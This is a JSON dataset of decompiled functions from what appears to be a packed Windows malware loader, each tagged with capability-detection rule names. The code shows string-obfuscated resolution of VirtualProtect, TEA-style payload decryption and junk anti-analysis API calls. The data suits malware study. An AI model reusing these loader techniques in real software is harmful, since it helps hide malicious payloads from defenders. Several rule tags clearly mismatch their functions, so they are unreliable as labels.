{
    "00402700": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid fcn.00402700(void)\n\n{\n    *0x438a48 = 100;\n    *0x438a3e = 0x6d;\n    *0x438a4a = 0x6c;\n    *0x438a46 = 0x2e;\n    *0x438a4c = 0x6c;\n    *0x438a44 = 0x32;\n    *0x438a3c = 0x69;\n    *0x438a38 = 0x6d;\n    *0x438a3a = 0x73;\n    *0x438a42 = 0x33;\n    *0x438a4e = 0;\n    *0x438a40 = 0x67;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x438a38);\n    return;\n}\n",
        "token_count": 197
    },
    "004027b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004027b0(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    *arg_8h = *arg_8h ^ arg_ch;\n    return;\n}\n",
        "token_count": 55
    },
    "004027d5": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004027d5(uint32_t *arg_8h, int32_t *lpBytesRead)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_EDX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint lpOutBuffer;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = *lpBytesRead;\n    var_1ch = lpBytesRead[1];\n    uVar2 = arg_8h[1];\n    var_14h = lpBytesRead[2];\n    var_ch = lpBytesRead[3];\n    uVar3 = *arg_8h;\n    var_4h = -0x3910c8e0;\n    var_18h = 0x9e3779b9;\n    if (*0x438a34 == 0x60b) {\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)(0x401270, 0, 0, &lpOutBuffer, 0, &lpBytesRead, 0);\n    }\n    do {\n        var_8h = uVar3 * 0x10 + var_14h;\n        uVar1 = (uVar3 >> 5) + var_ch;\n        *0x4385e4 = 0xffcf03fc;\n        fcn.004027b0(&var_8h, var_4h + uVar3);\n        *0x4385e4 = 0;\n        *0x4385ec = 0xffffffff;\n        uVar2 = uVar2 - (uVar1 ^ var_8h);\n        *0x4385e8 = 0xff6b3619;\n        uVar3 = uVar3 - (uVar2 * 0x10 + var_10h ^ (uVar2 >> 5) + var_1ch ^ var_4h + uVar2);\n        lpBytesRead = var_18h;\n        var_4h = var_4h - var_18h;\n    } while (extraout_EDX != 1);\n    *arg_8h = uVar3;\n    arg_8h[1] = uVar2;\n    return;\n}\n",
        "token_count": 542
    },
    "004028d2": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004028d2(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    for (arg_ch = arg_ch >> 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n        if (*0x438a34 == 0xb7d) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthW)(0);\n        }\n        if (*0x438a34 == 0x1c) {\n            (*_sym.imp.KERNEL32.dll_OpenMutexW)(0, 0, 0x40129c);\n            (*_sym.imp.KERNEL32.dll_EnumDateFormatsW)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesW)(0, 0);\n        }\n        fcn.004027d5(arg_8h, arg_10h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "00402a45": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00402a45(void)\n\n{\n    uint var_4h;\n    \n    *0x41f7ee = 0x33;\n    *0x41f7ef = 0x32;\n    *0x41f7f3 = 0x6c;\n    *0x41f7f2 = 0x6c;\n    *0x41f7eb = 0x6e;\n    *0x41f7ed = 0x6c;\n    *0x41f7e8 = 0x6b;\n    *0x41f7ec = 0x65;\n    *0x41f7ea = 0x72;\n    *0x41f7f0 = 0x2e;\n    *0x41f7f1 = 100;\n    *0x41f7e9 = 0x65;\n    *0x41f7f4 = 0;\n    *0x438a30 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x41f7e8);\n    *0x41f7f3 = 0x65;\n    *0x41f7e9 = 0x69;\n    *0x41f7ec = 0x75;\n    *0x41f7ee = 0x6c;\n    *0x41f7ed = 0x61;\n    *0x41f7f1 = 0x6f;\n    *0x41f7f5 = 0x74;\n    *0x41f7e8 = 0x56;\n    *0x41f7f4 = 99;\n    *0x41f7ef = 0x50;\n    *0x41f7f6 = 0;\n    *0x41f7eb = 0x74;\n    *0x41f7f2 = 0x74;\n    *0x41f7ea = 0x72;\n    *0x41f7f0 = 0x72;\n    *0x41f7e4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x438a30, 0x41f7e8);\n    (**0x41f7e4)(*0x4385e0, *0x438a34, 0x40, &var_4h);\n    return;\n}\n",
        "token_count": 531
    },
    "004034df": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004035d2: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004035d7)\n// WARNING: Removing unreachable block (ram,0x00403605)\n// WARNING: Removing unreachable block (ram,0x004035dd)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004034df(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00404740(0x40da80, 0x18);\n    fcn.0040421d(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x438e7c != 1) {\n        *0x438e78 = 1;\n        *0x438e74 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.0040399b(*0x43ab10);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.0040399b(*0x43ab0c);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00403992();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.0040399b(*piVar2);\n                        iVar3 = fcn.00403992();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.0040399b(*0x43ab10);\n                        piVar1 = fcn.0040399b(*0x43ab0c);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00403419(0x40122c);\n        }\n        fcn.00403419(0x401234);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00404143(8);\n    }\n    return;\n}\n",
        "token_count": 791
    },
    "00404cad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00404cad(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00404143(0);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00406e35": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00406e35(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00403992();\n    var_4h = 0;\n    if (*0x439594 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x401c24);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x401c18);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x439594 = fcn.00403920(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x401c08);\n        *0x439598 = fcn.00403920(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401bf4);\n        *0x43959c = fcn.00403920(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401bd8);\n        *0x4395a4 = fcn.00403920(uVar3);\n        if (*0x4395a4 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x401bc0);\n            *0x4395a0 = fcn.00403920(uVar3);\n        }\n    }\n    if ((*0x4395a0 != iVar1) && (*0x4395a4 != iVar1)) {\n        pcVar4 = fcn.0040399b(*0x4395a0);\n        pcVar5 = fcn.0040399b(*0x4395a4);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x00406f77;\n        }\n    }\n    if ((((*0x439598 != iVar1) && (pcVar4 = fcn.0040399b(*0x439598),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x43959c != iVar1 && (pcVar4 = fcn.0040399b(*0x43959c),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x00406f77:\n    pcVar4 = fcn.0040399b(*0x439594);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 824
    },
    "00407216": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407216(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x41f2d0) {\n        return;\n    }\n    *0x4396d8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4396dc = &arg_8h;\n    *0x439618 = 0x10001;\n    *0x4395c0 = 0xc0000409;\n    *0x4395c4 = 1;\n    var_328h = *0x41f2d0;\n    var_324h = *0x41f2d4;\n    *0x4395cc = unaff_retaddr;\n    *0x4396a4 = in_GS;\n    *0x4396a8 = in_FS;\n    *0x4396ac = in_ES;\n    *0x4396b0 = in_DS;\n    *0x4396b4 = unaff_EDI;\n    *0x4396b8 = unaff_ESI;\n    *0x4396bc = unaff_EBX;\n    *0x4396c0 = in_EDX;\n    *0x4396c4 = in_ECX;\n    *0x4396c8 = in_EAX;\n    *0x4396cc = unaff_EBP;\n    *0x4396d0 = unaff_retaddr;\n    *0x4396d4 = in_CS;\n    *0x4396e0 = in_SS;\n    *0x439610 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040720e(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x4025c8);\n    if (*0x439610 == 0) {\n        fcn.0040720e(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 843
    },
    "00408226": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408226(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00404740(0x40dcb8, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00404402();\n        *puVar2 = 0;\n        puVar2 = fcn.004043ef();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x43a9ec)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x43aa00;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040aac9(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004043ef();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00404402();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00407af3(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004082f8(0x40dcb8);\n                goto code_r0x004082f2;\n            }\n        }\n        puVar2 = fcn.00404402();\n        *puVar2 = 0;\n        puVar2 = fcn.004043ef();\n        *puVar2 = 9;\n        fcn.00404387(0, 0, 0, 0, 0);\n    }\ncode_r0x004082f2:\n    fcn.00404785();\n    return;\n}\n",
        "token_count": 625
    },
    "null": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402795": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402795(uint *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    *arg_8h = arg_10h;\n    return;\n}\n",
        "token_count": 54
    },
    "00402a37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402a37(void)\n\n{\n    *0x4385e0 = *0x4385e0 + 0x3aa5;\n    return;\n}\n",
        "token_count": 40
    },
    "00402b57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00402b57(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    uint lpszVolumeName;\n    uint var_83ch;\n    uint lpBuffer;\n    uint lpCPInfoEx;\n    uint hEvent;\n    uint var_24h;\n    uint ListHead;\n    uint var_10h;\n    uint lpNumberOfAttrsRead;\n    uint lpAttribute;\n    int32_t dwReadCoord;\n    \n    iVar3 = 0;\n    do {\n        if (iVar3 == 0x13e6) {\n            *0x438a34 = *0x438a34 + 0x38d6;\n        }\n        if (*0x438a34 == 0xbd8) {\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x31a652);\n    fcn.00402b43();\n    arg_8h = 0;\n    if (*0x438a34 != 0) {\n        do {\n            fcn.00402939(arg_8h);\n            if (*0x438a34 == 0x29) {\n                (*_sym.imp.KERNEL32.dll_CallNamedPipeA)(0, 0, 0, 0, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(&dwReadCoord);\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < *0x438a34);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetConsoleSelectionInfo;\n    pcVar1 = _sym.imp.KERNEL32.dll_MoveFileA;\n    dwReadCoord = 0x919802;\n    do {\n        if (*0x438a34 == 0x465) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasExesLengthW)();\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(&lpNumberOfAttrsRead);\n            (*pcVar2)(&var_24h);\n            (*_sym.imp.KERNEL32.dll_FindResourceA)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_SetHandleCount)(0);\n            (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, 0);\n            (*pcVar1)(0, 0);\n            (*_sym.imp.KERNEL32.dll_ResetEvent)(&hEvent);\n            (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)(0, &lpBuffer);\n            (*_sym.imp.KERNEL32.dll_MoveFileW)(0x4012cc, 0x4012b4);\n            (*_sym.imp.KERNEL32.dll_WriteFile)(0, 0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_DeactivateActCtx)(0, 0);\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(0);\n            (*_sym.imp.KERNEL32.dll_GetStringTypeExA)(0, 0, 0, 0, &lpAttribute);\n            (*_sym.imp.KERNEL32.dll_WritePrivateProfileSectionA)(0, 0, 0);\n            ListHead = 0;\n            var_10h = 0;\n            (*_sym.imp.KERNEL32.dll_QueryDepthSList)(&ListHead);\n            (*_sym.imp.KERNEL32.dll_EnumSystemLocalesA)(0, 0);\n            (*_sym.imp.KERNEL32.dll_VerSetConditionMask)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&var_83ch, 0);\n        }\n        dwReadCoord = dwReadCoord + -1;\n    } while (dwReadCoord != 0);\n    if (*0x438a34 == 0x19c) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynW)(&lpszVolumeName, 0x4012f8, 0);\n        (*_sym.imp.KERNEL32.dll_CopyFileW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_OpenJobObjectW)(0, lpNumberOfAttrsRead, 0);\n        (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)(0);\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0);\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(0, 0);\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(0x401388);\n        (*_sym.imp.KERNEL32.dll_ClearCommError)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_SetVolumeMountPointA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_GetConsoleTitleA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(0);\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(0, 0);\n        (*_sym.imp.KERNEL32.dll_AddAtomA)(0);\n        (*pcVar1)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetConsoleCtrlHandler)(0, 0);\n        (*_sym.imp.KERNEL32.dll_ZombifyActCtx)(0);\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    }\n    iVar3 = 0;\n    do {\n        if (*0x438a34 == 0x15a) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(0);\n        }\n        if (iVar3 == 0xab9d) {\n            *0x438a30 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x41f7e8);\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x2594b);\n    *0x41f7e8 = 0;\n    iVar3 = 0;\n    do {\n        if (iVar3 == 0x148) {\n            fcn.00402a45();\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x427fa7);\n    fcn.004028d2(*0x4385e0, *0x438a34, 0x40f010);\n    iVar3 = 0;\n    do {\n        if (*0x438a34 == 0xba) {\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(0);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFlags)(0);\n        if (iVar3 == 0x2f7e4) {\n            fcn.00402a37();\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x48122);\n    fcn.00402700();\n    if (*0x438a34 == 0x58c) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(0);\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeW)(&lpszVolumeName, 0);\n        (*pcVar2)(0);\n        dwReadCoord = 0;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleOutputAttribute)(0, &lpAttribute, 0, 0, &lpNumberOfAttrsRead);\n        (*_sym.imp.KERNEL32.dll_CreateJobObjectA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0x4013c0);\n        (*_sym.imp.KERNEL32.dll_FindResourceW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CopyFileW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetCPInfoExW)(0, 0, &lpCPInfoEx);\n    }\n    fcn.00402a31();\n    return 0;\n}\n",
        "token_count": 1736
    },
    "0040360b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040360b(uint arg_8h)\n\n{\n    fcn.004034df(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "00404576": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040458a)\n// WARNING: Removing unreachable block (ram,0x00404590)\n// WARNING: Removing unreachable block (ram,0x00404592)\n\nvoid fcn.00404576(void)\n\n{\n    return;\n}\n",
        "token_count": 61
    },
    "0040b538": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040b538(void)\n\n{\n    *0x41f764 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x402610, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00402939": {
        "rules": [
            "connect pipe",
            "read pipe",
            "write pipe",
            "get disk information",
            "create directory",
            "get common file path",
            "move file",
            "create mailslot"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpFilePart\n\nvoid __cdecl fcn.00402939(int32_t arg_8h)\n\n{\n    uint lpBuffer;\n    uint var_1020h;\n    uint var_c20h;\n    uint lpszVolumeMountPoint;\n    uint lpOutBuffer;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint *puStack144;\n    uint uStack140;\n    uint *puStack136;\n    uint uStack132;\n    uint *puStack128;\n    uint uStack124;\n    uint *puStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint *puStack68;\n    uint uStack64;\n    uint *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint lpBytesRead;\n    uint lpNumberOfEventsRead;\n    uint lpFilePart;\n    \n    lpFilePart = 0x402946;\n    fcn.00403340();\n    if (*0x438a34 == 0x37) {\n        lpNumberOfEventsRead = 0;\n        lpBytesRead = 0;\n        uStack20 = 0;\n        uStack24 = 0x40295f;\n        (*_sym.imp.KERNEL32.dll_CommConfigDialogA)();\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = 0;\n        var_20h = 0;\n        uStack40 = 0x402969;\n        (*_sym.imp.KERNEL32.dll_CreateMailslotA)();\n        uStack40 = 0;\n        uStack44 = 0;\n        puStack48 = 0x402971;\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n        puStack48 = &fcn.00402939::lpBuffer;\n        uStack52 = 0;\n        uStack56 = 0x40297f;\n        (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)();\n        uStack56 = 0;\n        puStack60 = &fcn.00402939::lpBytesRead;\n        uStack64 = 0;\n        puStack68 = &fcn.00402939::lpOutBuffer;\n        uStack72 = 0;\n        uStack76 = 0;\n        uStack80 = 0;\n        uStack84 = 0x402995;\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)();\n        uStack84 = 0;\n        uStack88 = 0;\n        puStack92 = 0x40299d;\n        (*_sym.imp.KERNEL32.dll_MoveFileA)();\n        puStack92 = &fcn.00402939::lpFilePart;\n        puStack96 = &fcn.00402939::var_1020h;\n        uStack100 = 0;\n        uStack104 = 0;\n        uStack108 = 0;\n        uStack112 = 0;\n        uStack116 = 0x4029b2;\n        (*_sym.imp.KERNEL32.dll_SearchPathA)();\n        uStack116 = 0;\n        puStack120 = &fcn.00402939::lpszVolumeMountPoint;\n        uStack124 = 0;\n        puStack128 = 0x4029c1;\n        (*_sym.imp.KERNEL32.dll_FindNextVolumeMountPointA)();\n        puStack128 = &fcn.00402939::lpNumberOfEventsRead;\n        uStack132 = 0;\n        puStack136 = &fcn.00402939::var_20h;\n        uStack140 = 0;\n        puStack144 = 0x4029d1;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleInputA)();\n        puStack144 = &fcn.00402939::var_c20h;\n        uStack148 = 0;\n        uStack152 = 0x4029df;\n        (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)();\n        uStack152 = 0;\n        uStack156 = 0;\n        uStack160 = 0;\n        uStack164 = 0x4029e8;\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryExW)();\n        uStack164 = 0x4012ac;\n        uStack168 = 0x4029f3;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        uStack168 = 0;\n        uStack172 = 0;\n        uStack176 = 0;\n        uStack180 = 0;\n        uStack184 = 0x4029fd;\n        (*_sym.imp.KERNEL32.dll_GetConsoleAliasW)();\n        uStack184 = 0x402a03;\n        (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        uStack184 = 0;\n        uStack188 = 0;\n        uStack192 = 0;\n        uStack196 = 0;\n        uStack200 = 0x402a0d;\n        (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)();\n        uStack200 = 0x402a13;\n        (*_sym.imp.KERNEL32.dll_AreFileApisANSI)();\n    }\n    *(*0x4385e0 + arg_8h) = *(*0x438e48 + 0x38d6 + arg_8h);\n    return;\n}\n",
        "token_count": 1332
    },
    "004036a3": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004036a3(uint lpFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(lpFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.00404415(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 117
    }
}